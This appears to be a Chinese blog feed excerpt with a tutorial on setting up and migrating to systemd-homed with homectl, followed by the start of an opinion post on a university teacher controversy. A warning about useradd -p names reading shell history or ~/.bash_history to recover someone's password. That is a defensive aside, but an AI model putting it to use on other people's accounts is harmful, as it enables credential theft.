systemctl start systemd-homed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>如果你的daemon没启动可能会出现<code>**Operation on home test1 failed: Failed to execute operation: Resource temporarily unavailable**</code></p>
<p>看到下面这样就行了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;dbus-org.freedesktop.home1.service → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-homed.service.
Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;multi-user.target.wants&#x2F;systemd-homed.service → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-homed.service.
Created symlink &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;sockets.target.wants&#x2F;systemd-userdbd.socket → &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;systemd-userdbd.socket.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>新建用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl create zhixi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>会像下面这样提示你输入密码，输完之后要稍等一会</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@zjk-allseries zjk<span class="token punctuation">]</span><span class="token comment"># homectl create zhixi</span>
🔐 Please enter new password <span class="token keyword">for</span> user zhixi: ******                  
🔐 Please enter new password <span class="token keyword">for</span> user zhixi <span class="token punctuation">(</span>repeat<span class="token punctuation">)</span>: <span class="token punctuation">(</span>press TAB <span class="token keyword">for</span> no <span class="token builtin class-name">echo</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>创建成功之后使用<code>homectl list</code>查看homectl创建的用户是否存在</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>root@zjk-allseries zjk<span class="token punctuation">]</span><span class="token comment"># homectl list</span>
NAME  <span class="token environment constant">UID</span>   GID   STATE    REALNAME <span class="token environment constant">HOME</span>        <span class="token environment constant">SHELL</span>    
<span class="token builtin class-name">test</span>  <span class="token number">60444</span> <span class="token number">60444</span> inactive <span class="token builtin class-name">test</span>     /home/test  /bin/bash
test1 <span class="token number">60510</span> <span class="token number">60510</span> inactive test1    /home/test1 /bin/bash
zhixi <span class="token number">60353</span> <span class="token number">60353</span> inactive zhixi    /home/zhixi /bin/bash

<span class="token number">3</span> home areas listed.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>homectl inspect username</code>可以查看用户信息</p>
<pre class="line-numbers language-none"><code class="language-none">[root@zjk-allseries zhixi]# homectl inspect zhixi
   User name: zhixi
       State: active
 Disposition: regular
 Last Change: Sat 2020-10-31 17:05:25 CST
    Login OK: yes
 Password OK: yes
         UID: 60353
         GID: 60353 (zhixi)
   Directory: &#x2F;home&#x2F;zhixi
     Storage: luks (strong encryption)
  Image Path: &#x2F;home&#x2F;zhixi.home
   Removable: no
       Shell: &#x2F;bin&#x2F;bash
LUKS Discard: online&#x3D;no offline&#x3D;yes
   LUKS UUID: 107ff22e399d417d92f398c91275de3b
   Part UUID: 645499ec3e554eaca0f09a9b172d89b3
     FS UUID: a6b5969ecfee4ae49f0cad9931f31589
 File System: ext4
 LUKS Cipher: aes
 Cipher Mode: xts-plain64
  Volume Key: 256bit
 Mount Flags: nosuid nodev exec
   Disk Size: 654.0G
  Disk Usage: 11.3G (&#x3D; 1.8%)
   Disk Free: 642.7G (&#x3D; 98.2%)
  Disk Floor: 11.3G
Disk Ceiling: 769.5G
  Good Auth.: 1
   Last Good: Sat 2020-10-31 19:23:25 CST
   Bad Auth.: 1
    Last Bad: Sat 2020-10-31 19:23:17 CST
    Next Try: anytime
 Auth. Limit: 30 attempts per 1min
   Passwords: 1
  Local Sig.: yes
     Service: io.systemd.Home
lines 2-36&#x2F;36 (END)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后激活用户</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl activate zhixi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>退出当前用户并切换用户就可以了(你可能需要更改PAM设置才能正常使用su切换用户)</p>
<h3 id="从原来的用户组管理方式迁往systemd-homed">从原来的用户组管理方式迁往systemd-homed</h3>
<blockquote>
<p>这里直接复读一下systemd官网的警告，需要手动操作、有风险、做好备份、出了事自行承担</p>
</blockquote>
<p>(不喜欢折腾的人不推荐这么干，原来的又不是不能用了</p>
<p>其实建议你直接去看<span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">官网的英文说明<i class="fa fa-external-link-alt"></i></span>，这个是给不想看官方文档的懒狗准备的（不会吧不会吧，不会真有这种懒狗吧）</p>
<p>切到root操作，先重命名你的用户目录，随便移到一个空间够的位置</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /home/zhixi /home/zhixi.saved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后看一下你的用户设置（假设用户名是zhixi,GID=1000），以及所在的用户组设置（1000改成你的GID）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getent <span class="token function">passwd</span> zhixi
getent shadow zhixi
getent group <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>（上面是官方文档的做法，也可以用<code>lslogin -u</code>查看）</p>
<p>把上面这些也备份一下。然后把<code>/etc/passwd</code>和<code>/etc/shadow</code>和<code>/etc/group</code>还有<code>/etc/gshadow</code>里面的zhixi用户相关的东西删了（基本上就只有一行）。</p>
<p>（官方文档说为了安全请使用<code>vipw</code>, <code>vipw -s</code>, <code>vigr</code> and <code>vigr -s</code>，这些是给配置文件加锁，防止多人同时更改出现问题，使用跟vim一样（找到那一行按dd然后ESC, :,wq回车就好了），如果你确定是自己一个人操作（也没有别人远程登陆或者其他程序正在修改），似乎用别的什么文本编辑器也没什么问题）</p>
<p>（其实，你可以直接用<code>userdel</code>删除）</p>
<p>然后剩下的操作跟第一节一样，用<code>homectl</code>新建一个就好了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl create zhixi --uid<span class="token operator">=</span><span class="token number">1000</span> --real-name<span class="token operator">=</span>zjk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>(uid填你的uid，real-name后面填你的GECOS)</p>
<p>可能你还想改改磁盘加密方式什么的，想设置的都先设置好。</p>
<p>然后rsync把原来备份了的东西放回<code>/home/zhixi</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">homectl with zhixi -- <span class="token function">rsync</span> -aHAXv --remove-source-files /home/zhixi.saved/ <span class="token builtin class-name">.</span> <span class="token operator">&amp;&amp;</span>  <span class="token function">rmdir</span> /home/foobar.saved<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="注意">注意</h3>
<p>systemd-homed是一个用户一个私有用户组。如果你一个用户组设置了多个用户的话，可能要调整一下。</p>
<h2 id="systemd-homed简介">systemd-homed简介</h2>
<p><del>感觉这下子systemd接管的东西更多了</del></p>
<h3 id="以前的用户和用户组管理">以前的用户和用户组管理</h3>
<p>好吧，以前要加引号，现在这个在大部分Linux都还没人用呢（甚至连一篇中文介绍都没有）。</p>
<p>通常使用<code>useradd</code>或<code>adduser</code>新建用户（不同发行版这两条命令有一点区别），比如</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">useradd</span> -U temp
<span class="token function">sudo</span> <span class="token function">useradd</span> temp1 -m -G temp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>新建一个temp用户组并给temp用户组中新建一个叫temp1的用户（同时在<code>/home</code>下新建一个<code>temp1</code>目录作为用户目录）。</p>
<p>然后使用<code>passwd temp1</code>为用户temp1指定密码</p>
<p>（虽然useradd有<code>-p</code>选项可以直接指定密码，通常不建议这样做，因为这样子恁的密码会明文留在历史命令里，如果有人不怀好意的执行一下<code>history</code>或者<code>more /home/$USER/.bash_history</code>或者<code>ctrl+r</code>搜索useradd，他将轻易获取你的密码），你用了sudo也可能会被找到，比如<span class="exturl" data-url="aHR0cHM6Ly9zdXBlcnVzZXIuY29tL3F1ZXN0aW9ucy8zMDk0MzQvaG93LXRvLXZpZXctY29tbWFuZC1oaXN0b3J5LW9mLWFub3RoZXItdXNlci1pbi1saW51eA==">这个<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vbmV3cy8xMzU4NDUuaHRtbA==">https://www.freebuf.com/news/135845.html<i class="fa fa-external-link-alt"></i></span> history -c 也不太保险</p>
<p>你的用户名、密码、用户组、权限配置基本都放在<code>/etc</code>目录下面，比如<code>/etc/passwd</code>里面存你的密码，<code>etc/group</code>里面放用户组的设置。<code>/etc/sudoers</code>是超级用户的设置。每个用户的配置散落在各个地方，一些个人设置还被放在了<code>/home/user</code>底下。</p>
<p>这个样子你需要<code>/etc</code>的写权限，一个用户不同系统迁移的时候需要同时迁移其他的目录（而且UID还得一样），想对<code>/home</code>单独加密也不太方便。</p>
<h3 id="变化">变化</h3>
<p>主要的变化就是你的个人用户都扔到<code>/home/yourusername</code>下面了。（据说）这样更方便加密和迁移。默认采用LUKS，在用户登陆的时候解密并挂载<code>/home/user</code>，在用户退出登陆的时候加密并取消挂载。休眠挂起（Suspend）的时候也会加密锁住。</p>
<p>比如你有一个u盘，里面装了你的用户目录，到别的电脑上插上去就能用了，不需要那边给你新建一个用户（现在基本不太行，对面电脑起码得也是systemd 245 版本以上还得启用<code>systemd-homed</code>，我乐观估计等这玩意普及至少得两年吧，那些用老CentOS的万年钉子户更别想了）</p>
<p>这样也方便全盘加密（我不是那种对物理安全都看的很在乎的申必人士，据说全盘加密会有点性能问题，而且休眠睡眠也比较容易起不来，所以我没试过）（不过恁不用这个systemd-homed其实也能全盘加密）</p>
<p>现在使用<code>systemd-homed.service</code>和<code>systemd-userdbd.service</code>两个daemon管理用户，登陆的时候是<code>systemd-logind</code> 在管。大概是这么个流程：</p>
<p><img src="/systemd-homed/image-20201108172857040.png" /></p>
<p><img src="/systemd-homed/image-20201108172321494.png" /></p>
<p>另外，Yubikeys现在是一等公民（说的好像这小玩意这么贵我买得起一样） Yubikeys或者别的加密设备我手头没有，而且LUKS加密home目录之类的我也没有那么高的安全需求，哪位好心人要是愿意送/借我一个玩玩，我把这部分内容补上</p>
<h3 id="现在的样子">现在的样子</h3>
<p>使用<code>homectl activate</code>激活用户目录后你会看到在<code>/home</code>目录下多了一个用户目录</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ homectl activate zhixi
🔐 Please enter password <span class="token keyword">for</span> user zhixi: ****** <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>原来<code>/home</code>下只有一个zhixi.home，activate之后多了一个zhixi目录</p>
<p>我们看一下这个目录下面有什么</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">cd</span> /home/zhixi <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span> -a
<span class="token builtin class-name">.</span>  <span class="token punctuation">..</span>  .bash_logout  .bash_profile  .bashrc  .identity<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其中的<code>.identity</code>存放你的密码等登陆认证信息（以json存储用户记录（JSON User Recoed））,大概长这样</p>
<figure>
<img src="/systemd-homed/image-20201108170804174.png" alt="image-20201108170804174" /><figcaption aria-hidden="true">image-20201108170804174</figcaption>
</figure>
<p><code>homectl inspect username</code>可以查看用户信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ homectl inspect zhixi
   User name: zhixi
       State: active
 Disposition: regular
 Last Change: Sat <span class="token number">2020</span>-10-31 <span class="token number">17</span>:05:25 CST
    Login OK: <span class="token function">yes</span>
 Password OK: <span class="token function">yes</span>
         <span class="token environment constant">UID</span><span class="token builtin class-name">:</span> <span class="token number">60353</span>
         GID: <span class="token number">60353</span> <span class="token punctuation">(</span>zhixi<span class="token punctuation">)</span>
   Directory: /home/zhixi
     Storage: luks <span class="token punctuation">(</span>strong encryption<span class="token punctuation">)</span>
  Image Path: /home/zhixi.home
   Removable: no
       Shell: /bin/bash
LUKS Discard: <span class="token assign-left variable">online</span><span class="token operator">=</span>no <span class="token assign-left variable">offline</span><span class="token operator">=</span>yes
   LUKS UUID: 107ff22e399d417d92f398c91275de3b
   Part UUID: 645499ec3e554eaca0f09a9b172d89b3
     FS UUID: a6b5969ecfee4ae49f0cad9931f31589
 File System: ext4
 LUKS Cipher: aes
 Cipher Mode: xts-plain64
  Volume Key: 256bit
 Mount Flags: nosuid nodev <span class="token builtin class-name">exec</span>
   Disk Size: <span class="token number">654</span>.0G
  Disk Usage: <span class="token number">11</span>.3G <span class="token punctuation">(</span><span class="token operator">=</span> <span class="token number">1.8</span>%<span class="token punctuation">)</span>
   Disk Free: <span class="token number">642</span>.7G <span class="token punctuation">(</span><span class="token operator">=</span> <span class="token number">98.2</span>%<span class="token punctuation">)</span>
  Disk Floor: <span class="token number">11</span>.3G
Disk Ceiling: <span class="token number">769</span>.5G
  Good Auth.: <span class="token number">1</span>
   Last Good: Sat <span class="token number">2020</span>-10-31 <span class="token number">19</span>:23:25 CST
   Bad Auth.: <span class="token number">1</span>
    Last Bad: Sat <span class="token number">2020</span>-10-31 <span class="token number">19</span>:23:17 CST
    Next Try: anytime
 Auth. Limit: <span class="token number">30</span> attempts per 1min
   Passwords: <span class="token number">1</span>
  Local Sig.: <span class="token function">yes</span>
     Service: io.systemd.Home
lines <span class="token number">2</span>-36/36 <span class="token punctuation">(</span>END<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="存在的一些问题">存在的一些问题</h3>
<p>这个东西主要是focus on <code>particularly Laptop users</code>，目前可能多多少少有点小问题。企业用途和运维貌似也不怎么需要这个。</p>
<h4 id="ssh的问题">SSH的问题</h4>
<p>这个东西直接把/home全都加密了，当然也包括<code>.ssh</code>目录下面的东西。</p>
<p>目前看来没有什么很完美的办法，有人是这样干的：先整一个其他的空用户在他的/home/user下面存公钥，用密码登陆，然后su切过去。(反正看起来挺扭曲的)</p>
<p>不过对于笔记本个人用户来说SSH到自己的加密盘貌似不是什么刚需，还是等完善了随身带着硬盘走比较好。</p>
<h4 id="休眠">休眠</h4>
<p>貌似不少人会碰到奇奇怪怪的休眠问题，很在意休眠的笔记本用户请谨慎上车。</p>
<h4 id="删除用户后sddm仍有残留">删除用户后SDDM仍有残留</h4>
<p>用<code>homectl activate</code>激活了一个用户temp1，然后用<code>homectl remove</code>删除了这个用户temp1，结果发现我的SDDM在登陆页面仍然有原来的temp1。检查<code>/home</code>发现这下面已经没有temp1.home文件了，但是还有temp1这个文件夹（受保护）。</p>
<p>我又用刚才新建的用户zhixi试了一下，在inactive情况下会比较干净的remove。</p>
<h2 id="可能的报错">可能的报错</h2>
<pre class="line-numbers language-none"><code class="language-none">homectl su: Authentication service cannot retrieve authentication info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>可能是你的daemon没启动，试试启动daemon并重启一下试试。</p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home me failed: Specified user name me conflicts with an NSS group by the same name, refusing.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用户组冲突了，看看你之前是不是用useradd之类的操作新建过同名用户组。</p>
<pre class="line-numbers language-none"><code class="language-none">su: Authentication service cannot retrieve authentication info<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个报错出现在我换到systemd-homed后试图用su切换用户。一开始我用 su 在桌面环境下切用户就没成功过，退出登陆后跑到SDDM里是可以的，本来以为这是个feature。后来觉得不应该啊，一查果然，要手动改PAM设置，在<code>/etc/pam.d</code>里面改一下su的配置就好了。配置照着模板改就好了，<code>man pam_systemd_home</code>，详情参考<span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWRlc2t0b3Aub3JnL3NvZnR3YXJlL3N5c3RlbWQvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuaHRtbA==">pam_systemd_home<i class="fa fa-external-link-alt"></i></span>，arch用户看<span class="exturl" data-url="aHR0cHM6Ly9qbGsuZmpmaS5jdnV0LmN6L2FyY2gvbWFucGFnZXMvbWFuL3BhbV9zeXN0ZW1kX2hvbWUuOA==">这里<i class="fa fa-external-link-alt"></i></span></p>
<figure>
<img src="/systemd-homed/image-20201108142022596.png" alt="PAM模板例子" /><figcaption aria-hidden="true">PAM模板例子</figcaption>
</figure>
<p>而且看起来很多时候有root权限它还是会让你输入当前用户的密码，比如<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N5c3RlbWQvc3lzdGVtZC9pc3N1ZXMvMTYxNjY=">这个issue<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home username failed: Access denied<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>权限不够，你至少需要root权限或者要切换到的那个用户的密码才能操作对应目录或者修改配置。（貌似homectl的很多操作需要输入）</p>
<pre class="line-numbers language-none"><code class="language-none">Operation on home username failed: Failed to execute operation: File exists<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>这个错误的原因可能有很多，或许可以试试<code>systemctl restart systemd-homed</code></p>
<pre class="line-numbers language-none"><code class="language-none">(Unknown (FileSystemError): Error: ENOSPC: no space left on device, write)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>我新建第二个的时候没有指定存储空间，直接塞满了。用<code>homectl resize user 10G</code>调整了磁盘分配后解决。</p>
<h2 id="附">附</h2>
<p>给不愿意<code>--help</code>看英文说明的懒狗翻译一下命令选项</p>
<h3 id="homectl命令选项">homectl命令选项</h3>
<table>
<colgroup>
<col style="width: 12%" />
<col style="width: 28%" />
<col style="width: 36%" />
<col style="width: 20%" />
<col style="width: 2%" />
</colgroup>
<thead>
<tr class="header">
<th>homectl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
<th></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>list</td>
<td>List home areas</td>
<td>列出用户信息（包括NAME UID GID STATE REALNAME HOME SHELL）</td>
<td>homectl list</td>
<td></td>
</tr>
<tr class="even">
<td>activate USER…</td>
<td>Activate a home area</td>
<td>激活用户（执行后<code>/home</code>下面会多出一个和用户同名的目录）</td>
<td>homectl activate zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>deactivate USER…</td>
<td>Deactivate a home area</td>
<td>取消激活</td>
<td>homectl deactivate zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>inspect USER…</td>
<td>Inspect a home area</td>
<td>查看用户信息，跟userdbctl user... 的输出差不多</td>
<td>homectl inspect zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>authenticate USER…</td>
<td>Authenticate a home area</td>
<td>验证用户</td>
<td>homectl authenticate zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>create USER</td>
<td>Create a home area</td>
<td>新建用户</td>
<td>homectl create zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>remove USER…</td>
<td>Remove a home area</td>
<td>移除用户</td>
<td>homectl remove zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>update USER</td>
<td>Update a home area</td>
<td>更改用户设置和状态</td>
<td>homectl update me --locked=false</td>
<td></td>
</tr>
<tr class="odd">
<td>passwd USER</td>
<td>Change password of a home area</td>
<td>改密码</td>
<td>homectl passwd zhixi</td>
<td></td>
</tr>
<tr class="even">
<td>with USER [COMMAND…]</td>
<td>Run shell or command with access to a home area</td>
<td>用到/在某个用户目录下执行命令（需要root或该用户密码）</td>
<td>homectl with zhixi -- mkdir test1</td>
<td></td>
</tr>
<tr class="odd">
<td>resize USER SIZE</td>
<td>Resize a home area</td>
<td>调整用户的存储空间</td>
<td>homectl resize zhixi 30G</td>
<td></td>
</tr>
<tr class="even">
<td>lock USER...</td>
<td>Temporarily lock an active home area</td>
<td>锁定用户</td>
<td>homectl lock zhixi</td>
<td></td>
</tr>
<tr class="odd">
<td>unlock USER</td>
<td>Unlock a temporarily locked home area</td>
<td>解锁用户</td>
<td>homectl unlock zhixi</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id="userdbctl命令选项">userdbctl命令选项</h3>
<table>
<colgroup>
<col style="width: 19%" />
<col style="width: 41%" />
<col style="width: 13%" />
<col style="width: 25%" />
</colgroup>
<thead>
<tr class="header">
<th>userdbctl</th>
<th>Explinations</th>
<th>作用</th>
<th>例子</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>user [USER…]</td>
<td>Inspect user</td>
<td>查看用户信息</td>
<td>userdbctl user zhixi</td>
</tr>
<tr class="even">
<td>group [GROUP…]</td>
<td>Inspect group</td>
<td>查看用户组信息</td>
<td>userdbctl group zhixi</td>
</tr>
<tr class="odd">
<td>users-in-group [GROUP…]</td>
<td>Show users that are members of specified group(s)</td>
<td>查看组中用户</td>
<td>userdbctl users-in-group zhixi</td>
</tr>
<tr class="even">
<td>groups-of-user [USER…]</td>
<td>Show groups the specified user(s) is a member of</td>
<td>查看用户所在的组</td>
<td>userdbctl groups-of-user zhixi</td>
</tr>
</tbody>
</table>
<h2 id="参考">参考</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0hPTUVfRElSRUNUT1JZLw==">https://systemd.io/HOME_DIRECTORY/<i class="fa fa-external-link-alt"></i></span> 官方文档</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubWFuNy5vcmcvbGludXgvbWFuLXBhZ2VzL21hbjEvaG9tZWN0bC4xLmh0bWw=">https://www.man7.org/linux/man-pages/man1/homectl.1.html<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuZnJlZWRlc2t0b3Aub3JnL3NvZnR3YXJlL3N5c3RlbWQvbWFuL2hvbWVjdGwuaHRtbA==">https://www.freedesktop.org/software/systemd/man/homectl.html<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzgxNDA2OC8=">systemd 245 released<i class="fa fa-external-link-alt"></i></span> systemd第245次更新详情</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1N5c3RlbWQtaG9tZWQ=">https://wiki.archlinux.org/index.php/Systemd-homed<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL1VzZXJzX2FuZF9ncm91cHNfKOeugOS9k+S4reaWhyk=">https://wiki.archlinux.org/index.php/Users_and_groups_(简体中文)<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zeXN0ZW1kLmlvL0NPTlZFUlRJTkdfVE9fSE9NRUQv">https://systemd.io/CONVERTING_TO_HOMED/<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy9mZ2M5MWIvd2l0aF9zeXN0ZW1kXzI0NV9sYW5kaW5nX2luX3JlcG9zX3N5c3RlbWRob21lZF9pcy8=">https://www.reddit.com/r/archlinux/comments/fgc91b/with_systemd_245_landing_in_repos_systemdhomed_is/<i class="fa fa-external-link-alt"></i></span> 在Arch上使用的reddit讨论，archwiki的页面也是这个帖子的楼主写的</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tZWRpYS5jY2MuZGUvdi9BU0cyMDE5LTE2NC1yZWludmVudGluZy1ob21lLWRpcmVjdG9yaWVz">https://media.ccc.de/v/ASG2019-164-reinventing-home-directories<i class="fa fa-external-link-alt"></i></span> 一个传教视频</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jZnAuYWxsLXN5c3RlbXMtZ28uaW8vbWVkaWEvaG9tZWQtYXNnMjAxOS5wZGY=">https://cfp.all-systems-go.io/media/homed-asg2019.pdf<i class="fa fa-external-link-alt"></i></span> 一个传教PPT</p>
<p>其他的一些简介</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9saW51eHJldmlld3Mub3JnL1N5c3RlbWQtSG9tZWRfSXNfTWVyZ2VkX0FuZF9JdF9XaWxsX0Z1bmRhbWVudGFsbHlfQ2hhbmdlX0xpbnV4X0hvbWVfRGlyZWN0b3JpZXM=">https://linuxreviews.org/Systemd-Homed_Is_Merged_And_It_Will_Fundamentally_Change_Linux_Home_Directories<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjaHJlcHVibGljLmNvbS9hcnRpY2xlL2xpbnV4LWhvbWUtZGlyZWN0b3J5LW1hbmFnZW1lbnQtaXMtYWJvdXQtdG8tdW5kZXJnby1tYWpvci1jaGFuZ2Uv">https://www.techrepublic.com/article/linux-home-directory-management-is-about-to-undergo-major-change/<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>homectl</tag>
        <tag>systemd-homed</tag>
      </tags>
  </entry>
  <entry>
    <title>郑文锋老师的四大发明事件始末</title>
    <url>/16e8/</url>
    <content><![CDATA[<p>今天在<span class="exturl" data-url="aHR0cHM6Ly91ZXN0Yy5pY3U=">uestc.icu<i class="fa fa-external-link-alt"></i></span>和微博上看见好几次，貌似出了个红头文件处理结果，无法确定真假。当时最早那个知乎问题上了知乎热搜第一的时候我也目睹了。在这里随便扯一下吧，夹杂大量个人主观判断。 <span id="more"></span></p>
<p><img width=200 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/xzx.jpg" alt="镇楼"/></p>
<p>起因是一名研究生<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9sb2c=">在知乎发帖<i class="fa fa-external-link-alt"></i></span>，想搞个大新闻，此前貌似就在河畔发帖试图搞个大新闻未遂，被獾狸猿删除后转战知乎。然而事与愿违，确实火了，但是是被喷上热搜的，而且登顶热搜第一。这里不得不再一次说你电公关确实了得，大半夜的热搜瞬间被撤，掉下来后又上了热搜，又瞬间从第二名掉到十几名;而且问题下面的回答还在以肉眼可见的速度不断减少，从接近两千变成一千五百多，又变成一千三百多，即便算上被折叠的评论，也是有问题的。而且该问题还被隐藏了，直接知乎站内搜索你是搜不到的（现在直接搜依然搜不到） <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/pic1.PNG" alt="最初的问题" /></p>
<h3 id="想搞个大新闻的学生">想搞个大新闻的学生</h3>
<p>对于该研究生，我个人是鄙夷的。当时几乎目睹了全过程。将老师挂起来公然批斗。然而匿名提问，还把自己在QQ截图中的头像名称全都打码，知乎提问却直接指名道姓，上来就“公然侮辱”，滑天下之大稽。 此外还有该生之前完全旷课理亏在先等，此处不表。</p>
<p>电卫兵，电卫兵.jpg <img width=300 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/student1.jpg" alt="电卫兵言论大赏"/> 擦屁股言论可真是太搞笑了 <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5OTM4OTQ4MC9hbnN3ZXIvNTE2NDQyMzg3">https://www.zhihu.com/question/299389480/answer/516442387<i class="fa fa-external-link-alt"></i></span> <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/beifeng.PNG" alt="北风三号机" /></p>
<p>而一些难以证实的传言和截图表明此事行为更加恶劣 <img width=300 src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/%E5%8A%88%E6%88%90.jpg" alt="小道消息"/></p>
<h3 id="郑文锋老师">郑文锋老师</h3>
<p>我也不认识郑老师，也没上过他的课，跟他不熟 （或许我读研时有机会去看看他的课，如果他不是真被处分停课的话）</p>
